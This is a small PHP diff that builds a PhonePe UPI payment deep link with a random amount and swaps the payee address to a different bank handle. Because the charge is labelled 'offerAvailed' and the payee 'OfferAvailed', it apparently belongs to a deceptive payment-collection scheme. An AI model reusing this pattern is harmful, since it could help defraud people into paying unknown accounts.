@@ -7,7 +7,7 @@ $random_amount = number_format(mt_rand($min_amount * 100, $max_amount * 100) / 1
 // URL components
 $base_url = "phonepe://pay";
 $params = [
-    "pa" => "fcbizuswuzb@freecharge",
+    "pa" => "eazypay.ntb1100036677@icici",
     "tn" => "offerAvailed",
     "am" => $random_amount,
     "pn" => "OfferAvailed",
